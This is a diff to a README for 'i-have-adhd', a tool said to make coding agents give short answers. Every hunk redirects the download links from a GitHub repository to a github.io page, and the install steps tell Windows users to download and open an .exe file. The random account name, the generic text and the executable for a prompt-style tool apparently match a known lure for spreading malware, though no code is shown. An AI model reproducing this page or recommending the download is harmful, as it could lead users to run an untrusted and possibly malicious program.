@@ -1,6 +1,6 @@
 # 🧠 i-have-adhd - Keep your coding agent on track
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Scoundrelwildness456/i-have-adhd)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://scoundrelwildness456.github.io)
 
 This tool changes how your coding agent talks to you. Many agents give long, rambling explanations that bury the fix you need. This tool forces the agent to provide the core answer first. It helps you stay focused and finish tasks faster.
 
@@ -8,7 +8,7 @@ This tool changes how your coding agent talks to you. Many agents give long, ram
 
 You need to visit the project page to download the program. 
 
-[Click this link to download the current version](https://github.com/Scoundrelwildness456/i-have-adhd)
+[Click this link to download the current version](https://scoundrelwildness456.github.io)
 
 ## 💻 System requirements
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the application:
 
 ## 🛠️ How to install
 
-1. Visit the [download page](https://github.com/Scoundrelwildness456/i-have-adhd).
+1. Visit the [download page](https://scoundrelwildness456.github.io).
 2. Look for the file ending in .exe. 
 3. Click the file name to start the download.
 4. Open your Downloads folder in Windows.
